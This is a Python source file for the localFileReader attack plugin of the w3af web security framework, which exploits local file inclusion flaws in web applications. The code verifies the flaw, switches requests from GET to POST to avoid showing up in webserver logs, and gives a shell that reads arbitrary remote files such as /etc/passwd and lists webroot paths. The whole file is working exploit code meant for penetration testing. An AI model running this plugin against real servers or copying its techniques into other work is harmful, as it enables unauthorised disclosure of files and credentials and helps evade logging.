'''
localFileReader.py

Copyright 2006 Andres Riancho

This file is part of w3af, w3af.sourceforge.net .

w3af is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation version 2 of the License.

w3af is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with w3af; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

'''


import core.controllers.outputManager as om
# options
from core.data.options.option import option
from core.data.options.optionList import optionList
from core.controllers.basePlugin.baseAttackPlugin import baseAttackPlugin

import core.data.kb.knowledgeBase as kb
from core.data.kb.shell import shell as shell

from core.controllers.w3afException import w3afException
import core.data.parsers.urlParser as urlParser

class localFileReader(baseAttackPlugin):
    '''
    Exploit local file inclusion bugs.
    @author: Andres Riancho ( andres.riancho@gmail.com )
    '''

    def __init__(self):
        baseAttackPlugin.__init__(self)
        
        # User configured variables
        self._changeToPost = True
        self._url = ''
        self._method = 'GET'
        self._data = ''
        self._filePattern = ''
        self._generateOnlyOne = True
        
    def fastExploit( self ):
        '''
        Exploits a web app with local file include vuln.
        '''
        if self._url == ''or self._filePattern == '' or self._data == '':
            om.out.error('You have to configure the "url" parameter.')
        else:
            v = vuln.vuln()
            v.setURL( self._url )
            v.setMethod( self._method )
            v.setDc( self._data )
            v['filePattern'] = self._filePattern
            kb.kb.append( 'localFileInclude', 'localFileInclude', v )
    
    def getAttackType(self):
        return 'shell'
    
    def getVulnName2Exploit( self ):
        return 'localFileInclude'
        
    def _generateShell( self, vuln ):
        '''
        @parameter vuln: The vuln to exploit.
        @return: The shell object based on the vulnerability that was passed as a parameter.
        '''
        # Check if we really can execute commands on the remote server
        if self._verifyVuln( vuln ):
            
            if vuln.getMethod() != 'POST' and self._changeToPost and self._verifyVuln( self.GET2POST( vuln ) ):
                om.out.information('The vulnerability was found using method GET, but POST is being used during this exploit.')
                vuln = self.GET2POST( vuln )
            else:
                om.out.information('The vulnerability was found using method GET, tried to change the method to POST for exploiting but failed.')
            
            # Create the shell object
            s = fileReaderShell( vuln )
            s.setUrlOpener( self._urlOpener )
            s.setCut( self._header, self._footer )
            
            return s
            
        else:
            return None

    def _verifyVuln( self, vuln ):
        '''
        This command verifies a vuln. This is really hard work!

        @return : True if vuln can be exploited.
        '''
        functionReference = getattr( self._urlOpener , vuln.getMethod() )
        try:
            response = functionReference( vuln.getURL(), str(vuln.getDc()) )
        except w3afException, e:
            om.out.error( str(e) )
            return False
        else:
            if self._defineCut( response.getBody(), vuln['filePattern'], exact=False ):
                return True
            else:
                return False

    def getOptionsXML(self):
        '''
        This method returns a XML containing the Options that the plugin has.
        Using this XML the framework will build a window, a menu, or some other input method to retrieve
        the info from the user. The XML has to validate against the xml schema file located at :
        w3af/core/ui/userInterface.dtd
        
        @return: XML with the plugin options.
        ''' 
        return  '<?xml version="1.0" encoding="ISO-8859-1"?>\
        <OptionList>\
            <Option name="changeToPost">\
                <default>'+str(self._changeToPost)+'</default>\
                <desc>If the vulnerability was found in a GET request, try to change the method to POST during exploitation.</desc>\
                <help>If the vulnerability was found in a GET request, try to change the method to POST during exploitation; this is usefull for not being logged in the webserver logs.</help>\
                <type>boolean</type>\
            </Option>\
            <Option name="url">\
                <default>'+self._url+'</default>\
                <desc>URL to exploit with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="method">\
                <default>'+self._method+'</default>\
                <desc>Method to use with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="data">\
                <default>'+self._data+'</default>\
                <desc>Data to send with fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="filePattern">\
                <default>'+self._filePattern+'</default>\
                <desc>The file pattern to search for while verifiyng the vulnerability. Only used in fastExploit()</desc>\
                <type>string</type>\
            </Option>\
            <Option name="generateOnlyOne">\
                <default>'+str(self._generateOnlyOne)+'</default>\
                <desc>If true, this plugin will try to generate only one shell object.</desc>\
                <type>boolean</type>\
            </Option>\
        </OptionList>\
        '

    def setOptions( self, optionsMap ):
        '''
        This method sets all the options that are configured using the user interface 
        generated by the framework using the result of getOptionsXML().
        
        @parameter optionsMap: A dict with the options for the plugin.
        @return: No value is returned.
        ''' 
        self._changeToPost = optionsMap['changeToPost']
        self._url = optionsMap['url']
        self._method = optionsMap['method']
        self._data = urlParser.getQueryString( optionsMap['data'] )
        self._filePattern = optionsMap['filePattern']
        self._generateOnlyOne = optionsMap['generateOnlyOne']
        
    def getPluginDeps( self ):
        '''
        @return: A list with the names of the plugins that should be runned before the
        current one.
        '''
        return []
    
    def getRootProbability( self ):
        '''
        @return: This method returns the probability of getting a root shell using this attack plugin.
        This is used by the "exploit *" function to order the plugins and first try to exploit the more critical ones.
        This method should return 0 for an exploit that will never return a root shell, and 1 for an exploit that WILL ALWAYS
        return a root shell.
        '''
        return 0.0
        
    def getLongDesc( self ):
        '''
        @return: A DETAILED description of the plugin functions and features.
        '''
        return '''
        This plugin exploits local file inclusion and let's you "cat" every file you want. Remember, if the file
        in being read with an "include()" statement, you wont be able to read the source code of the script 
        file, you will end up reading the result of the script interpretation. You can also use the "list" command
        to list all files inside the known paths.
        
        One configurable parameters exist:
            - changeToPost
        '''
        
class fileReaderShell(shell):
    
    _catMsg = 'localFileReader shell is restricted to two commands cat and list. Example: "cat /etc/passwd" .'
    _catMsg += '\nThe list command prints (if possible) a list of the full path to all files in the webroot.'
        
    def _rexec( self, command ):
        '''
        This method is called when a command is being sent to the remote server.
        This is a NON-interactive shell. In this case, the only available command is "cat"

        @parameter command: The command to send ( cat is the only supported command. ).
        @return: The result of the command.
        '''
        # Check that the command is cat and it has a param
        cmd = command.split(' ')[0]
        if cmd == 'list':
            return self._list()
        elif cmd == 'cat':
            try:
                file = command.split(' ')[1]
            except:
                return self._catMsg
            else:
                return self._cat( file )
            
    def _cat( self, filename ):
        # Lets send the command.
        functionReference = getattr( self._urlOpener , self.getMethod() )
        dc = self.getDc()
        dc[ self.getVar() ] = filename
        try:
            response = functionReference( self.getURL() ,  str(dc) )
        except w3afException, e:
            return 'Error "' + str(e) + '" while sending command to remote host. Try again.'
        else:
            return self._filterErrors( self._cut( response.getBody() ) )
                
    def _list( self ):
        '''
        Using some path disclosure problems I can make a good guess
        of the full paths of all files in the webroot, this is the result of
        that guess
        '''
        pathDiscList = kb.kb.getData( 'pathDisclosure' , 'listFiles' )
        
        res = ''
        if not pathDiscList:
            res = 'Not enough path disclosure information was collected to return meaningful information.'
        else:
            for path in pathDiscList:
                res += path +'\n'
        
        return res
            
    def _filterErrors( self, result ):
        '''
        Filter out ugly php errors and print a simple "Permission denied" or "File not found"
        '''
        if result.count('<b>Warning</b>'):
            if result.count( 'Permission denied' ):
                result = 'Permission denied.'
            elif result.count( 'No such file or directory in' ):
                result = 'No such file or directory.'
            elif result.count( 'Not a directory in' ):
                result = 'Cannot cat a directory.'
            elif result.count('</a>]: failed to open stream:'):
                result = 'Failed to open stream.'
        return result
    
    def end( self ):
        om.out.debug('fileReaderShell cleanup complete.')
        
    def _identifyOs( self ):
        '''
        Identify the remote operating system and get some remote variables to show to the user.
        '''
        res = self._cat('/etc/passwd')
        if 'root:' in res:
            self._rOS = 'linux'
        else:
            self._rOS = 'windows'
    
    def __repr__( self ):
        if not self._rOS:
            self._identifyOs()
        return '<shell object (rsystem: "'+self._rOS+'")>'
        
    __str__ = __repr__
    
    def getName( self ):
        return 'localFileReader'
        
